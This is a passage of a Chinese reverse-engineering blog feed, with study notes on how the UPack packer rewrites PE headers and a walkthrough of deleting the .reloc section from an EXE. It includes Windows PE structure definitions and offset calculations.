class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     WORD e_magic;<span class="comment">//关键字段1⃣️</span></span><br><span class="line">     WORD e_cblp;</span><br><span class="line">     WORD e_cp;</span><br><span class="line">     WORD e_crlc;</span><br><span class="line">     WORD e_cparhdr;</span><br><span class="line">     WORD e_minalloc;</span><br><span class="line">     WORD e_maxalloc;</span><br><span class="line">     WORD e_ss;</span><br><span class="line">     WORD e_sp;</span><br><span class="line">     WORD e_csum;</span><br><span class="line">     WORD e_ip;</span><br><span class="line">     WORD e_cs;</span><br><span class="line">     WORD e_lfarlc;</span><br><span class="line">     WORD e_ovno;</span><br><span class="line">     WORD e_res[<span class="number">4</span>];</span><br><span class="line">     WORD e_oemid;</span><br><span class="line">     WORD e_oeminfo;</span><br><span class="line">     WORD e_res2[<span class="number">10</span>];</span><br><span class="line">     LONG e_lfanew;<span class="comment">//关键字段2⃣️</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>UPack压缩后的PE头布局在十六进制下的视图：</p><p>e_lfnew &#x3D; 0x00000010 使得IMAGE_NT_HEADERS在第二行就开始了。</p><hr><h5 id="IMAGE-NT-HEADERS-gt-FileHeader-SizeOfOptionalHeader"><a href="#IMAGE-NT-HEADERS-gt-FileHeader-SizeOfOptionalHeader" class="headerlink" title="_IMAGE_NT_HEADERS -&gt; FileHeader.SizeOfOptionalHeader"></a>_IMAGE_NT_HEADERS -&gt; FileHeader.SizeOfOptionalHeader</h5><p>FileHeader.SizeOfOptionalHeader用于指示_IMAGE_NT_HEADERS结构下的第三个结构体成员_IMAGE_OPTIONAL_HEADER所占的大小。</p><p>示例文件中的的SizeOfOptionalHeader的值由0x00E0变为0x0148，<strong>此举的目的在于拉伸_IMAGE_OPTIONAL_HEADER的大小</strong>（实际不需要用那么多，这是为了让过多余的空间可用于存放解压代码，在文件运行的瞬间执行，将压缩的PE头进行还原）。</p><p>SizeOfOptionalHeader字段的存在也是在设计之初为了兼容不同大小的SizeOfOptionalHeader而存在的，32位的PE32中-IMAGE_OPTIONAL_HEADER大小为0xE0，64位下PE32中_IMAGE_OPTIONAL_HEADER的大小为0xF0。</p><p>此外，压缩后的_IMAGE_FILE_HEADER结束是从0x26+2（最后一个字段Characteristic占2byte）也就是从0x28是为_IMAGE_OPTIONAL_HEADER的起始位置。</p><p>故<strong>_IMAGE_OPTIONAL_HEADER的起始位置0x28</strong>+SizeOfOptionalHeader（0x148）&#x3D;0x170为_IMAGE_SECTION_HEADER的开端。</p><p><strong>分析压缩后的OptionalHeader：区域0x28～0x16F，其中0x28～0x108是正常的OptionalHeader，0x108～0x16F是扩容出来的部分，可用于写入解压缩过程需要的资源</strong></p><hr><h5 id="IMAGE-OPTIONAL-HEADER-NumberOfRvaAndSizes"><a href="#IMAGE-OPTIONAL-HEADER-NumberOfRvaAndSizes" class="headerlink" title="IMAGE_OPTIONAL_HEADER.NumberOfRvaAndSizes"></a>IMAGE_OPTIONAL_HEADER.NumberOfRvaAndSizes</h5><p>NumberOfRvaAndSizes用于指示OptionalHeader最后一个成员数组DataDirectory的成员个数，正常是16个，值0x10，Upack修改为0x0A。</p><p>为验证上述结论，对比压缩前后的OptionalHeader.NumberOfRvaAndSizes</p><p>压缩前，直接使用工具读取即可：</p><p>压缩后的可使用OptionalHeader.NumberOfRvaAndSizes字段在OptionalHeader的相对偏移计算，文首的PE图中得知该字段相对于OptionalHeader的偏移为0x5C，又步骤二分析的值OptionalHeader的起始位置是0x28，因此计算得到压缩后的OptionalHeader.NumberOfRvaAndSizes &#x3D; 0x0A</p><p>UPack此举的目的在于将_IMAGE_OPTIONAL_HEADER最后一个结构体数组成员的元素的不必要元素进行缩减，所节省出来的空间可用于写入解压缩代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<span class="comment">//每个数组成员元素占8byte</span></span><br></pre></td></tr></table></figure><p>至此可以回答步骤二中留的疑问：经扩展后的OptionalHeader（0xE0 -&gt; 0x108）哪个部分开始存放着UPack的代码？</p><p>答：_IMAGE_OPTIONAL_HEADER最后一个成员_IMAGE_DATA_DIRECTORY的相对于OptionalHeader的起始位置偏移时0x60（从文首PE结构图得出）并且经过缩减实际交付OptionalHeader的_IMAGE_DATA_DIRECTORY只有10个单元，每个单元占8byte，OptionalHeader起始位置0x28，故UPack的代码区域为0xD8～0x16F：</p><p>OllyDbg中选中部分对应的部分代码：</p><hr><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="IMAGE-SECTION-HEADER的内容"><a href="#IMAGE-SECTION-HEADER的内容" class="headerlink" title="IMAGE_SECTION_HEADER的内容"></a>IMAGE_SECTION_HEADER的内容</h5><p>经过前面的分析，已经知道_IMAGE_SECTION_HEADER的起始位置是0x170，工具分析出压缩后的文件也是三个节区，再根据每个节区的结构体大小0x28可分出三个节区头。</p><p>查资料了解到UPack会利用节区头中一些对程序运行无意义的字段用于存放UPack解压缩是需要用到的一些数据，下面就剖析哪些字段被挪用以及都写入了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;<span class="comment">//对程序运行无意义的字段1</span></span><br><span class="line">  DWORD PointerToLinenumbers;<span class="comment">//对程序运行无意义的字段2</span></span><br><span class="line">  WORD  NumberOfRelocations;<span class="comment">//对程序运行无意义的字段3</span></span><br><span class="line">  WORD  NumberOfLinenumbers;<span class="comment">//对程序运行无意义的字段4，一共12个byte的内容。</span></span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>即三个节区对应的节区头IMAGE_SECTION_HEADER中有12byte的空间可被UPack利用。在由文首的PE结构图中相对位置可以知道：相对每个节区头起始的偏移0x18 - 0x24的数据会是UPack的内容，下面是压缩前后的对比（举例第一个节区即可，其他类似）：</p><hr><h5 id="节区重叠"><a href="#节区重叠" class="headerlink" title="节区重叠"></a>节区重叠</h5><p>使用工具查看经UPack压缩后的文件的节区信息，结果第一、三节区在文件中的偏移地址和所占文件的大小一致（文件起始地址：0x10，大小：0x1F0）</p><p>PE格式第一部分是DOS_HEADER的部分，图中的信息说明了经压缩后的文件从0x000～0x1F0这区间内的内容映射到内存会是三个部分（DOS_HEADER（RAW0x10属于该部分）、第一个节区&amp;第三个节区（节区信息决定）），在学习《逆向工程核心原理》一书中提到了第一个节区的内存空间（VirtualSize）实际上是未压缩前文件的ImageSize大小（字段位于OptionalHeader.SizeOfImage），这里做下验证：</p><p>回到先前的分析，节区信息中关于第一、三节区的raw size &#x3D; 0x1F0这实际上很小，而第二个节区的raw size &#x3D; 0xAE28 非常大。</p><p>书中提到的是第二个节区占据文件大部分空间实际上这里存放的是未经压缩的文件信息在这里，然后在压缩文件运行瞬间，借由先前分析的一些用于写入UPack解压代码和数据（主要是OptionalHeader到SectionHeader扩容出来的空间【0x108～0x16F】）进行处理，<strong>会将第二节区的内容进行解压到第一个节区与原SizeOfImage相同的内存空间。</strong></p><hr><h5 id="RVA2RAW-1"><a href="#RVA2RAW-1" class="headerlink" title="RVA2RAW"></a>RVA2RAW</h5><p>解压Upack压缩的代码（在第二个节区）到第一节区，需要找到程序的入口以正常运行程序，涉及到RVA2RAW的地址转换</p><p>RVA2RAW的变换（注意PointToRawData要遵循值是OptionalHeader.FileAlignment或OptionalHeader.SectionAlignment的整数倍规则）</p><p>各种PE分析软件对于经UPack压缩后的文件束手无策的一点原因是无法完成有效的RVA to RAW转换，导致结构错乱，无法正常识别出文件，下边是RVA2RAW的转换方法：<br>$$<br>RAW - PointToRawData &#x3D; RVA - VirtualAddress<br>$$</p><blockquote><p>其中VirtualAddress、PointToRawData是在节区头中相应字段读取出来的值，是已知值。</p></blockquote><p>以计算文件EntryPoint为例，AddressOfEntryPoint的RVA在OptionalHeader中有字段记录。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;<span class="comment">//EntryPoint的RVA记录字段</span></span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;<span class="comment">//这个字段先记着，后文会使用到。</span></span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>以UPack压缩后的notepad.exe进行分析：</p><p>由文首给出的PE结构图可知AddressOfEntryPoint相对于OptionalHeader的偏移是0x10，</p><p>由前篇内容已分析出OptionalHeader的起始地址是0x28，可读取EntryPoint的RVA是0x00001018</p><p>以节区一为例，经UPack扩展后的OptionalHeader（大小由0xE0扩到0x148）结束位置为0x170（ps：上文分析的结果），结合_IMAGE_SECTION_HEADER结构体以及文首图中SectionHeader中字段的相对偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>可读出VitualAddress &#x3D; 0x00001000、 PointToRawData &#x3D; 0x00000010</p><p>根据上文提到的转换公式，可知RAW &#x3D; RVA - VirtualAddress + PointToRawData </p><p>代入则 RAW&#x3D;  0x00001018 - 0x00001000 + 0x00000010 &#x3D; 0x00000028，查看0x00000028：</p><p>可以看到此处是字符串LoadLibraryA字符串的位置，并不是节区一代码的开始。</p><p><strong>这是为什么呢？</strong></p><p>《逆向工程核心技术》书中提到<code> 一般而言，指向节区开始的文件偏移PointToRawData字段的值应该是FileAlignment的整数倍。</code>FileAlignment的值在OptionalHeader中，该字段在结构体中相对偏移查看经UPack压缩后的值：</p><p>故先前计算的 RAW &#x3D; RVA - VirtualAddress + PointToRawData 中PointToRawData 应为0，故实际上的节区一代码区间从</p><p>RAW&#x3D;  0x00001018 - 0x00001000 + 0x00000000 &#x3D; 0x00000018开始：</p><p>在OllyDbg中查看部分代码：</p><hr><h5 id="导入表-1"><a href="#导入表-1" class="headerlink" title="导入表"></a>导入表</h5><p>IMAGR_IMPORT_DESCRIPTOR的信息存放于OptionalHeader.DataDirectory数组中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>每个数组元素占8byte，而导入表的信息是存放于数组的第二个元素</p><p>查看UPack处理后的导入表信息：</p><p>可知导入表的RVA &#x3D; 0x000271EE 导入表的Size &#x3D; 0x00000014.</p><p>根据RVA2RAW转换公式计算需要用到节区对应的VirtualAddress 和 PointToRawData，先查看RVA所在的节区</p><p>即导入表所在的节区的是第三节区，需要查看第三节区的 VirtualAddress 和 PointToRawData</p><p>第三节区的内容：</p><p>由此得到第三节区的 VirtualAddress &#x3D; 0x00027000 和 PointToRawData &#x3D; 0x00000010（根据OptionalHeader.FileAlignment &#x3D; 0x200）</p><p>故导入表的RAW &#x3D; 0x000271EE  - 0x00027000  + 0 &#x3D; 0x000001EE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        DWORD OriginalFirstThunk;<span class="comment">//指向输入名称表的表（INT）的RVA   </span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD TimeDateStamp;</span><br><span class="line">    DWORD ForwarderChain;</span><br><span class="line">    DWORD Name;<span class="comment">//指向导入映像文件的名称</span></span><br><span class="line">    DWORD FirstThunk;<span class="comment">//指向输入地址表的表（IAT）的RVA  </span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;<span class="comment">//指向一个转向者字符串的RVA；</span></span><br><span class="line">        PDWORD Function;      <span class="comment">//被输入的函数的内存地址；</span></span><br><span class="line">        DWORD Ordinal;       <span class="comment">//被输入的API的序数值</span></span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;      <span class="comment">//指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD Hint;<span class="comment">//ordinal</span></span><br><span class="line">    BYTE Name[<span class="number">1</span>];<span class="comment">//function name string</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class="line">---------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>导入表每个成员都是一个_IMAGE_IMPORT_DESCRIPTOR，占20byte，且结构体数组最后以NULL结构体结束。查看0x000001EE</p><p>可以看到末20byte为0，故导入表只有一个成员，即选中的前20byte.</p><p>指向INT的字段OriginalFirstThunk &#x3D; 0x00000000 指向IAT的字段FirstThunk &#x3D; 0x000011E8，但需要注意的是：</p><p>即RAW 0x200起始往后都不是节区的内容。</p><p>透过上述的两个关键字段可以看出文件导入了哪些DLL以及导入了哪些API，但指向INT的字段OriginalFirstThunk的RVA &#x3D; 0（略显奇怪）但引用《逆向工程核心原理》的话：</p><blockquote><p>一般而言，跟踪OriginalFirstThunk（INT）能够发现API名称字符串，但是像UPack这样OriginalFirstThunk的RVA&#x3D;0时，跟踪FirstThunk （IAT）也无妨，只要INT、IAT其中有一个有API名称字符串即可。</p></blockquote><p>这里跟踪FirstThunk 的RVA（0x11E8），计算RAW的值需要节区三中的VirtualAddress以及PointerToRawData的值。</p><p>根据文首的PE结构图中节区的大小以及字段的相对偏移可以看出：VirtualAddress &#x3D; 0x00001000  PointerToRawData &#x3D; 0x00000010</p><p>注意SectionAlignment</p><p>故RAW &#x3D; 0x11E8 - 0x1000 + 0x0000 &#x3D; 0x01E8</p><p>FirstThunk RAW &#x3D;  0x01E8 指向的是一个IMAGE_DIRECTORY_ENTRY_IMPORT结构体数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DIRECTORY_ENTRY_IMPORT</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DIRECTORY_ENTRY_IMPORT</span>&#123;</span></span><br><span class="line">    DWORD VirtualAddress;</span><br><span class="line">    DWORD Size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>至此，可以解读0x01E8中的内容：以8byte内容为单元</p><p>RVA &#x3D; 0x00000028 Size &#x3D; 0x000000BE</p><p><strong>RVA &#x3D; 0x00000028不属于节区部分，属于header区域的部分，在header中RVA &#x3D; RAW，故不需要转化</strong>，直接查看即可：</p><p>同理，可以查看导入的DLL名称，读取出来的值为0x00000002，这也是header的部分，因此不需要转换，上图也可以看出导入的是KERNEL32.DLL，往后查看size &#x3D; 0xBE的内容可以查看当前KERNEL32.DLL载入的所有函数。</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.3--节区删除</title>
      <link href="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/"/>
      <url>/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h4><p>EXE格式的PE文件中，基址重定位表对运行没有影响，实际上将其删除后文件仍可正常运行，本节在于删除示例程序reloc.exe的.reloc节区并完成PE格式相关字段的修正使得删除后文件仍可正常运行。</p><p>（PS：基址重定位表对于DLL&#x2F;SYS形式的可执行文件来说几乎是必须的，不可作为本节的实例文件）</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/PE.png" class=""><hr><h5 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h5><p>删除节区的步骤</p><p>1⃣️：NOP填充节区头IMAGE_SECTION_HEADER（使之无效，因此不会出现PE装载器装载时出现PE不合法的情况）</p><p>2⃣️：删除整个节区内容</p><p>3⃣️：修正节区数（节区头数量决定，由于NOP掉了一个因此-1），修正Image size（删除了节区的内容，注意节区大小对齐问题）</p><p>PS：目前不清楚步骤的看完后文估计能有很好的了解。</p><h5 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="_IMAGE_SECTION_HEADER"></a>_IMAGE_SECTION_HEADER</h5><p>节区头的结构体是_IMAGE_SECTION_HEADER</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;<span class="comment">//后续会删除整个节区因此指示节区起始的位置需要做变动</span></span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>文件在PEView中：</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/1.png" class=""><p>可见.reloc节区头信息起始地址（RVA）&#x3D; 0x270到节区头结构体最后一个成员characteristic起始地址（RVA）为0x294，由于characteristic成员值占4byte，故节区头的大小是28（294-270+4）。</p><p>另外删除节区是在文件中删除以及修改文件的，因此需要计算出相应的信息在文件中的偏移，这个过程需要用到的是目标节区头中的Pointer to Raw data字段，记录的是节区起始文件偏移。这里是0xC000</p><h5 id="NULL覆盖-reloc节区头信息"><a href="#NULL覆盖-reloc节区头信息" class="headerlink" title="NULL覆盖.reloc节区头信息"></a>NULL覆盖.reloc节区头信息</h5><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/2.png" class=""><h5 id="删除节区-reloc的内容"><a href="#删除节区-reloc的内容" class="headerlink" title="删除节区.reloc的内容"></a>删除节区.reloc的内容</h5><p>上文提到IMAGE_SECTION_HEADER中字段Pointer To Raw Data可知节区起始文件偏移是0xC000，这里由于节区.reloc是PE文件的最后一个节区，因此删除从此处开始到文件末的内容</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/3.png" class=""><p>工具也提示了会改变文件大小，因此后续需要做的工作是修改相应的字段保持PE格式的完整</p><hr><h5 id="修改NumberOfSections"><a href="#修改NumberOfSections" class="headerlink" title="修改NumberOfSections"></a>修改NumberOfSections</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD  Machine;</span><br><span class="line">  WORD  NumberOfSections;<span class="comment">//做相应的节数-1</span></span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD  SizeOfOptionalHeader;</span><br><span class="line">  WORD  Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>需要修改的是&#x3D;&#x3D;节区数 -1&#x3D;&#x3D;， 即对应位置要修正5个节区为4个节区，下图在IMAGE_FILE_HEADER中的NumberOfSection字段在文件偏移为0xDE</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/4.png" class=""><p>完成节区数修改</p><hr><h5 id="修改SizeOfImage"><a href="#修改SizeOfImage" class="headerlink" title="修改SizeOfImage"></a>修改SizeOfImage</h5><p>删除节区内容后的PE文件会变小，需要修正PE文件中的相应字段，使得PE装载器在装载的过程中没有出现差错。</p><p>从上文提到的.reloc节区信息中得到该节区的vitual size为0xE40，但由于存在节区对齐的机制，相应的节区大小会做对齐处理，具体对齐格式在IMAGE_OPTIONAL_HEADER中有字段进行记录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                